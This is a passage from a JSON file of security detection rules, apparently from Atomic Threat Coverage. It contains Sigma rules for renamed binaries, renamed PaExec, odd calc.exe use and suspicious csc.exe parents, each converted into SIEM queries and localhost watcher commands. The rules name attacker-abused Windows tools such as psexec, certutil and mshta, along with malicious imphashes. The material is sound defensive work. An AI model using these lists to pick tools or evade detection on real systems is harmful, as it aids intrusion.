'cmd.exe'\n            - 'powershell.exe'\n            - 'powershell_ise.exe'\n            - 'psexec.exe'\n            - 'psexec.c'  # old versions of psexec (2016 seen)\n            - 'cscript.exe'\n            - 'wscript.exe'\n            - 'mshta.exe'\n            - 'regsvr32.exe'\n            - 'wmic.exe'\n            - 'certutil.exe'\n            - 'rundll32.exe'\n            - 'cmstp.exe'\n            - 'msiexec.exe'\n            - '7z.exe'\n            - 'winrar.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n            - '\\psexec.exe'\n            - '\\psexec64.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'\n            - '\\certutil.exe'\n            - '\\rundll32.exe'\n            - '\\cmstp.exe'\n            - '\\msiexec.exe'\n            - '\\7z.exe'\n            - '\\winrar.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Renamed Binary\nid: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142\nstatus: experimental\ndescription: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\nauthor: Matthew Green - @mgreen27, Ecco, James Pemberton / @4A616D6573, oscd.community (improvements)\ndate: 2019/06/15\nmodified: 2019/11/11\nreferences:\n    - https://attack.mitre.org/techniques/T1036/\n    - https://mgreen27.github.io/posts/2019/05/12/BinaryRename.html\n    - https://mgreen27.github.io/posts/2019/05/29/BinaryRename2.html\ntags:\n    - attack.t1036\n    - attack.defense_evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        OriginalFileName:\n            - 'cmd.exe'\n            - 'powershell.exe'\n            - 'powershell_ise.exe'\n            - 'psexec.exe'\n            - 'psexec.c'  # old versions of psexec (2016 seen)\n            - 'cscript.exe'\n            - 'wscript.exe'\n            - 'mshta.exe'\n            - 'regsvr32.exe'\n            - 'wmic.exe'\n            - 'certutil.exe'\n            - 'rundll32.exe'\n            - 'cmstp.exe'\n            - 'msiexec.exe'\n            - '7z.exe'\n            - 'winrar.exe'\n            - 'wevtutil.exe'\n            - 'net.exe'\n            - 'net1.exe'\n    filter:\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\powershell_ise.exe'\n            - '\\psexec.exe'\n            - '\\psexec64.exe'\n            - '\\cscript.exe'\n            - '\\wscript.exe'\n            - '\\mshta.exe'\n            - '\\regsvr32.exe'\n            - '\\wmic.exe'\n            - '\\certutil.exe'\n            - '\\rundll32.exe'\n            - '\\cmstp.exe'\n            - '\\msiexec.exe'\n            - '\\7z.exe'\n            - '\\winrar.exe'\n            - '\\wevtutil.exe'\n            - '\\net.exe'\n            - '\\net1.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(OriginalFileName:(\"cmd.exe\" OR \"powershell.exe\" OR \"powershell_ise.exe\" OR \"psexec.exe\" OR \"psexec.c\" OR \"cscript.exe\" OR \"wscript.exe\" OR \"mshta.exe\" OR \"regsvr32.exe\" OR \"wmic.exe\" OR \"certutil.exe\" OR \"rundll32.exe\" OR \"cmstp.exe\" OR \"msiexec.exe\" OR \"7z.exe\" OR \"winrar.exe\" OR \"wevtutil.exe\" OR \"net.exe\" OR \"net1.exe\") AND (NOT (Image.keyword:(*\\\\\\\\cmd.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\powershell_ise.exe OR *\\\\\\\\psexec.exe OR *\\\\\\\\psexec64.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\wscript.exe OR *\\\\\\\\mshta.exe OR *\\\\\\\\regsvr32.exe OR *\\\\\\\\wmic.exe OR *\\\\\\\\certutil.exe OR *\\\\\\\\rundll32.exe OR *\\\\\\\\cmstp.exe OR *\\\\\\\\msiexec.exe OR *\\\\\\\\7z.exe OR *\\\\\\\\winrar.exe OR *\\\\\\\\wevtutil.exe OR *\\\\\\\\net.exe OR *\\\\\\\\net1.exe))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Renamed-Binary <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Renamed Binary\",\\n    \"description\": \"Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.\",\\n    \"tags\": [\\n      \"attack.t1036\",\\n      \"attack.defense_evasion\"\\n    ],\\n    \"query\": \"(OriginalFileName:(\\\\\"cmd.exe\\\\\" OR \\\\\"powershell.exe\\\\\" OR \\\\\"powershell_ise.exe\\\\\" OR \\\\\"psexec.exe\\\\\" OR \\\\\"psexec.c\\\\\" OR \\\\\"cscript.exe\\\\\" OR \\\\\"wscript.exe\\\\\" OR \\\\\"mshta.exe\\\\\" OR \\\\\"regsvr32.exe\\\\\" OR \\\\\"wmic.exe\\\\\" OR \\\\\"certutil.exe\\\\\" OR \\\\\"rundll32.exe\\\\\" OR \\\\\"cmstp.exe\\\\\" OR \\\\\"msiexec.exe\\\\\" OR \\\\\"7z.exe\\\\\" OR \\\\\"winrar.exe\\\\\" OR \\\\\"wevtutil.exe\\\\\" OR \\\\\"net.exe\\\\\" OR \\\\\"net1.exe\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe OR *\\\\\\\\\\\\\\\\psexec.exe OR *\\\\\\\\\\\\\\\\psexec64.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\certutil.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\cmstp.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\7z.exe OR *\\\\\\\\\\\\\\\\winrar.exe OR *\\\\\\\\\\\\\\\\wevtutil.exe OR *\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(OriginalFileName:(\\\\\"cmd.exe\\\\\" OR \\\\\"powershell.exe\\\\\" OR \\\\\"powershell_ise.exe\\\\\" OR \\\\\"psexec.exe\\\\\" OR \\\\\"psexec.c\\\\\" OR \\\\\"cscript.exe\\\\\" OR \\\\\"wscript.exe\\\\\" OR \\\\\"mshta.exe\\\\\" OR \\\\\"regsvr32.exe\\\\\" OR \\\\\"wmic.exe\\\\\" OR \\\\\"certutil.exe\\\\\" OR \\\\\"rundll32.exe\\\\\" OR \\\\\"cmstp.exe\\\\\" OR \\\\\"msiexec.exe\\\\\" OR \\\\\"7z.exe\\\\\" OR \\\\\"winrar.exe\\\\\" OR \\\\\"wevtutil.exe\\\\\" OR \\\\\"net.exe\\\\\" OR \\\\\"net1.exe\\\\\") AND (NOT (Image.keyword:(*\\\\\\\\\\\\\\\\cmd.exe OR *\\\\\\\\\\\\\\\\powershell.exe OR *\\\\\\\\\\\\\\\\powershell_ise.exe OR *\\\\\\\\\\\\\\\\psexec.exe OR *\\\\\\\\\\\\\\\\psexec64.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe OR *\\\\\\\\\\\\\\\\regsvr32.exe OR *\\\\\\\\\\\\\\\\wmic.exe OR *\\\\\\\\\\\\\\\\certutil.exe OR *\\\\\\\\\\\\\\\\rundll32.exe OR *\\\\\\\\\\\\\\\\cmstp.exe OR *\\\\\\\\\\\\\\\\msiexec.exe OR *\\\\\\\\\\\\\\\\7z.exe OR *\\\\\\\\\\\\\\\\winrar.exe OR *\\\\\\\\\\\\\\\\wevtutil.exe OR *\\\\\\\\\\\\\\\\net.exe OR *\\\\\\\\\\\\\\\\net1.exe))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Renamed Binary\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(OriginalFileName:(\"cmd.exe\" \"powershell.exe\" \"powershell_ise.exe\" \"psexec.exe\" \"psexec.c\" \"cscript.exe\" \"wscript.exe\" \"mshta.exe\" \"regsvr32.exe\" \"wmic.exe\" \"certutil.exe\" \"rundll32.exe\" \"cmstp.exe\" \"msiexec.exe\" \"7z.exe\" \"winrar.exe\" \"wevtutil.exe\" \"net.exe\" \"net1.exe\") AND (NOT (Image.keyword:(*\\\\\\\\cmd.exe *\\\\\\\\powershell.exe *\\\\\\\\powershell_ise.exe *\\\\\\\\psexec.exe *\\\\\\\\psexec64.exe *\\\\\\\\cscript.exe *\\\\\\\\wscript.exe *\\\\\\\\mshta.exe *\\\\\\\\regsvr32.exe *\\\\\\\\wmic.exe *\\\\\\\\certutil.exe *\\\\\\\\rundll32.exe *\\\\\\\\cmstp.exe *\\\\\\\\msiexec.exe *\\\\\\\\7z.exe *\\\\\\\\winrar.exe *\\\\\\\\wevtutil.exe *\\\\\\\\net.exe *\\\\\\\\net1.exe))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((OriginalFileName=\"cmd.exe\" OR OriginalFileName=\"powershell.exe\" OR OriginalFileName=\"powershell_ise.exe\" OR OriginalFileName=\"psexec.exe\" OR OriginalFileName=\"psexec.c\" OR OriginalFileName=\"cscript.exe\" OR OriginalFileName=\"wscript.exe\" OR OriginalFileName=\"mshta.exe\" OR OriginalFileName=\"regsvr32.exe\" OR OriginalFileName=\"wmic.exe\" OR OriginalFileName=\"certutil.exe\" OR OriginalFileName=\"rundll32.exe\" OR OriginalFileName=\"cmstp.exe\" OR OriginalFileName=\"msiexec.exe\" OR OriginalFileName=\"7z.exe\" OR OriginalFileName=\"winrar.exe\" OR OriginalFileName=\"wevtutil.exe\" OR OriginalFileName=\"net.exe\" OR OriginalFileName=\"net1.exe\") NOT ((Image=\"*\\\\\\\\cmd.exe\" OR Image=\"*\\\\\\\\powershell.exe\" OR Image=\"*\\\\\\\\powershell_ise.exe\" OR Image=\"*\\\\\\\\psexec.exe\" OR Image=\"*\\\\\\\\psexec64.exe\" OR Image=\"*\\\\\\\\cscript.exe\" OR Image=\"*\\\\\\\\wscript.exe\" OR Image=\"*\\\\\\\\mshta.exe\" OR Image=\"*\\\\\\\\regsvr32.exe\" OR Image=\"*\\\\\\\\wmic.exe\" OR Image=\"*\\\\\\\\certutil.exe\" OR Image=\"*\\\\\\\\rundll32.exe\" OR Image=\"*\\\\\\\\cmstp.exe\" OR Image=\"*\\\\\\\\msiexec.exe\" OR Image=\"*\\\\\\\\7z.exe\" OR Image=\"*\\\\\\\\winrar.exe\" OR Image=\"*\\\\\\\\wevtutil.exe\" OR Image=\"*\\\\\\\\net.exe\" OR Image=\"*\\\\\\\\net1.exe\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" OriginalFileName IN [\"cmd.exe\", \"powershell.exe\", \"powershell_ise.exe\", \"psexec.exe\", \"psexec.c\", \"cscript.exe\", \"wscript.exe\", \"mshta.exe\", \"regsvr32.exe\", \"wmic.exe\", \"certutil.exe\", \"rundll32.exe\", \"cmstp.exe\", \"msiexec.exe\", \"7z.exe\", \"winrar.exe\", \"wevtutil.exe\", \"net.exe\", \"net1.exe\"]  -(Image IN [\"*\\\\\\\\cmd.exe\", \"*\\\\\\\\powershell.exe\", \"*\\\\\\\\powershell_ise.exe\", \"*\\\\\\\\psexec.exe\", \"*\\\\\\\\psexec64.exe\", \"*\\\\\\\\cscript.exe\", \"*\\\\\\\\wscript.exe\", \"*\\\\\\\\mshta.exe\", \"*\\\\\\\\regsvr32.exe\", \"*\\\\\\\\wmic.exe\", \"*\\\\\\\\certutil.exe\", \"*\\\\\\\\rundll32.exe\", \"*\\\\\\\\cmstp.exe\", \"*\\\\\\\\msiexec.exe\", \"*\\\\\\\\7z.exe\", \"*\\\\\\\\winrar.exe\", \"*\\\\\\\\wevtutil.exe\", \"*\\\\\\\\net.exe\", \"*\\\\\\\\net1.exe\"]))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*cmd\\\\.exe|.*powershell\\\\.exe|.*powershell_ise\\\\.exe|.*psexec\\\\.exe|.*psexec\\\\.c|.*cscript\\\\.exe|.*wscript\\\\.exe|.*mshta\\\\.exe|.*regsvr32\\\\.exe|.*wmic\\\\.exe|.*certutil\\\\.exe|.*rundll32\\\\.exe|.*cmstp\\\\.exe|.*msiexec\\\\.exe|.*7z\\\\.exe|.*winrar\\\\.exe|.*wevtutil\\\\.exe|.*net\\\\.exe|.*net1\\\\.exe))(?=.*(?!.*(?:.*(?=.*(?:.*.*\\\\cmd\\\\.exe|.*.*\\\\powershell\\\\.exe|.*.*\\\\powershell_ise\\\\.exe|.*.*\\\\psexec\\\\.exe|.*.*\\\\psexec64\\\\.exe|.*.*\\\\cscript\\\\.exe|.*.*\\\\wscript\\\\.exe|.*.*\\\\mshta\\\\.exe|.*.*\\\\regsvr32\\\\.exe|.*.*\\\\wmic\\\\.exe|.*.*\\\\certutil\\\\.exe|.*.*\\\\rundll32\\\\.exe|.*.*\\\\cmstp\\\\.exe|.*.*\\\\msiexec\\\\.exe|.*.*\\\\7z\\\\.exe|.*.*\\\\winrar\\\\.exe|.*.*\\\\wevtutil\\\\.exe|.*.*\\\\net\\\\.exe|.*.*\\\\net1\\\\.exe))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Execution of Renamed PaExec\nid: 7b0666ad-3e38-4e3d-9bab-78b06de85f7b\nstatus: experimental\ndescription: Detects execution of renamed paexec via imphash and executable product string\nreferences:\n    - sha256=01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc\n    - https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - FIN7\n    - car.2013-05-009\ndate: 2019/04/17\nauthor: Jason Lynch \nfalsepositives:\n    - Unknown imphashes\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Product:\n            - '*PAExec*'\n    selection2:\n        Imphash:\n            - 11D40A7B7876288F919AB819CC2D9802\n            - 6444f8a34e99b8f7d9647de66aabe516\n            - dfd6aa3f7b2b1035b76b718f1ddc689f\n            - 1a6cca4d5460b1710a12dea39e4a592c\n    filter1:\n        Image: '*paexec*'\n    condition: (selection1 and selection2) and not filter1", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Execution of Renamed PaExec\nid: 7b0666ad-3e38-4e3d-9bab-78b06de85f7b\nstatus: experimental\ndescription: Detects execution of renamed paexec via imphash and executable product string\nreferences:\n    - sha256=01a461ad68d11b5b5096f45eb54df9ba62c5af413fa9eb544eacb598373a26bc\n    - https://summit.fireeye.com/content/dam/fireeye-www/summit/cds-2018/presentations/cds18-technical-s05-att&cking-fin7.pdf\ntags:\n    - attack.defense_evasion\n    - attack.t1036\n    - FIN7\n    - car.2013-05-009\ndate: 2019/04/17\nauthor: Jason Lynch \nfalsepositives:\n    - Unknown imphashes\nlevel: medium\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        Product:\n            - '*PAExec*'\n    selection2:\n        Imphash:\n            - 11D40A7B7876288F919AB819CC2D9802\n            - 6444f8a34e99b8f7d9647de66aabe516\n            - dfd6aa3f7b2b1035b76b718f1ddc689f\n            - 1a6cca4d5460b1710a12dea39e4a592c\n    filter1:\n        Image: '*paexec*'\n    condition: (selection1 and selection2) and not filter1", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Product.keyword:(*PAExec*) AND Imphash:(\"11D40A7B7876288F919AB819CC2D9802\" OR \"6444f8a34e99b8f7d9647de66aabe516\" OR \"dfd6aa3f7b2b1035b76b718f1ddc689f\" OR \"1a6cca4d5460b1710a12dea39e4a592c\")) AND (NOT (Image.keyword:*paexec*)))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Execution-of-Renamed-PaExec <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Execution of Renamed PaExec\",\\n    \"description\": \"Detects execution of renamed paexec via imphash and executable product string\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\",\\n      \"FIN7\",\\n      \"car.2013-05-009\"\\n    ],\\n    \"query\": \"((Product.keyword:(*PAExec*) AND Imphash:(\\\\\"11D40A7B7876288F919AB819CC2D9802\\\\\" OR \\\\\"6444f8a34e99b8f7d9647de66aabe516\\\\\" OR \\\\\"dfd6aa3f7b2b1035b76b718f1ddc689f\\\\\" OR \\\\\"1a6cca4d5460b1710a12dea39e4a592c\\\\\")) AND (NOT (Image.keyword:*paexec*)))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Product.keyword:(*PAExec*) AND Imphash:(\\\\\"11D40A7B7876288F919AB819CC2D9802\\\\\" OR \\\\\"6444f8a34e99b8f7d9647de66aabe516\\\\\" OR \\\\\"dfd6aa3f7b2b1035b76b718f1ddc689f\\\\\" OR \\\\\"1a6cca4d5460b1710a12dea39e4a592c\\\\\")) AND (NOT (Image.keyword:*paexec*)))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Execution of Renamed PaExec\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Product.keyword:(*PAExec*) AND Imphash:(\"11D40A7B7876288F919AB819CC2D9802\" \"6444f8a34e99b8f7d9647de66aabe516\" \"dfd6aa3f7b2b1035b76b718f1ddc689f\" \"1a6cca4d5460b1710a12dea39e4a592c\")) AND (NOT (Image.keyword:*paexec*)))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(((Product=\"*PAExec*\") (Imphash=\"11D40A7B7876288F919AB819CC2D9802\" OR Imphash=\"6444f8a34e99b8f7d9647de66aabe516\" OR Imphash=\"dfd6aa3f7b2b1035b76b718f1ddc689f\" OR Imphash=\"1a6cca4d5460b1710a12dea39e4a592c\")) NOT (Image=\"*paexec*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (event_id=\"1\" Product IN [\"*PAExec*\"] Imphash IN [\"11D40A7B7876288F919AB819CC2D9802\", \"6444f8a34e99b8f7d9647de66aabe516\", \"dfd6aa3f7b2b1035b76b718f1ddc689f\", \"1a6cca4d5460b1710a12dea39e4a592c\"])  -(Image=\"*paexec*\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*(?:.*(?=.*(?:.*.*PAExec.*))(?=.*(?:.*11D40A7B7876288F919AB819CC2D9802|.*6444f8a34e99b8f7d9647de66aabe516|.*dfd6aa3f7b2b1035b76b718f1ddc689f|.*1a6cca4d5460b1710a12dea39e4a592c))))(?=.*(?!.*(?:.*(?=.*.*paexec.*)))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Calculator Usage\nid: 737e618a-a410-49b5-bec3-9e55ff7fbc15\ndescription: Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion\nstatus: experimental\nreferences:\n    - https://twitter.com/ItsReallyNick/status/1094080242686312448\nauthor: Florian Roth\ndate: 2019/02/09\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*\\calc.exe *'\n    selection2:\n        Image: '*\\calc.exe'\n    filter2:\n        Image: '*\\Windows\\Sys*'\n    condition: selection1 or ( selection2 and not filter2 )\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Calculator Usage\nid: 737e618a-a410-49b5-bec3-9e55ff7fbc15\ndescription: Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion\nstatus: experimental\nreferences:\n    - https://twitter.com/ItsReallyNick/status/1094080242686312448\nauthor: Florian Roth\ndate: 2019/02/09\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine: '*\\calc.exe *'\n    selection2:\n        Image: '*\\calc.exe'\n    filter2:\n        Image: '*\\Windows\\Sys*'\n    condition: selection1 or ( selection2 and not filter2 )\nfalsepositives:\n    - Unknown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(CommandLine.keyword:*\\\\\\\\calc.exe\\\\ * OR (Image.keyword:*\\\\\\\\calc.exe AND (NOT (Image.keyword:*\\\\\\\\Windows\\\\\\\\Sys*))))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Calculator-Usage <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Calculator Usage\",\\n    \"description\": \"Detects suspicious use of calc.exe with command line parameters or in a suspicious directory, which is likely caused by some PoC or detection evasion\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\calc.exe\\\\\\\\ * OR (Image.keyword:*\\\\\\\\\\\\\\\\calc.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Sys*))))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(CommandLine.keyword:*\\\\\\\\\\\\\\\\calc.exe\\\\\\\\ * OR (Image.keyword:*\\\\\\\\\\\\\\\\calc.exe AND (NOT (Image.keyword:*\\\\\\\\\\\\\\\\Windows\\\\\\\\\\\\\\\\Sys*))))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Suspicious Calculator Usage\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(CommandLine.keyword:*\\\\\\\\calc.exe * OR (Image.keyword:*\\\\\\\\calc.exe AND (NOT (Image.keyword:*\\\\\\\\Windows\\\\\\\\Sys*))))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(CommandLine=\"*\\\\\\\\calc.exe *\" OR (Image=\"*\\\\\\\\calc.exe\" NOT (Image=\"*\\\\\\\\Windows\\\\\\\\Sys*\")))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (CommandLine=\"*\\\\\\\\calc.exe *\" OR (event_id=\"1\" Image=\"*\\\\\\\\calc.exe\"  -(Image=\"*\\\\\\\\Windows\\\\\\\\Sys*\"))))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\calc\\\\.exe .*|.*(?:.*(?=.*.*\\\\calc\\\\.exe)(?=.*(?!.*(?:.*(?=.*.*\\\\Windows\\\\Sys.*)))))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "title: Suspicious Parent of Csc.exe\nid: b730a276-6b63-41b8-bcf8-55930c8fc6ee\ndescription: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery\nstatus: experimental\nreferences:\n    - https://twitter.com/SBousseaden/status/1094924091256176641\nauthor: Florian Roth\ndate: 2019/02/11\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\csc.exe*'\n        ParentImage:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Suspicious Parent of Csc.exe\nid: b730a276-6b63-41b8-bcf8-55930c8fc6ee\ndescription: Detects a suspicious parent of csc.exe, which could by a sign of payload delivery\nstatus: experimental\nreferences:\n    - https://twitter.com/SBousseaden/status/1094924091256176641\nauthor: Florian Roth\ndate: 2019/02/11\ntags:\n    - attack.defense_evasion\n    - attack.t1036\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image: '*\\csc.exe*'\n        ParentImage:\n            - '*\\wscript.exe'\n            - '*\\cscript.exe'\n            - '*\\mshta.exe'\n    condition: selection\nfalsepositives:\n    - Unkown\nlevel: high", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\csc.exe* AND ParentImage.keyword:(*\\\\\\\\wscript.exe OR *\\\\\\\\cscript.exe OR *\\\\\\\\mshta.exe))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Suspicious-Parent-of-Csc.exe <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Suspicious Parent of Csc.exe\",\\n    \"description\": \"Detects a suspicious parent of csc.exe, which could by a sign of payload delivery\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1036\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\csc.exe* AND ParentImage.keyword:(*\\\\\\\\\\\\\\\\wscript.exe OR *\\\\\\\\\\\\\\\\cscript.exe OR *\\\\\\\\\\\\\\\\mshta.exe))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": 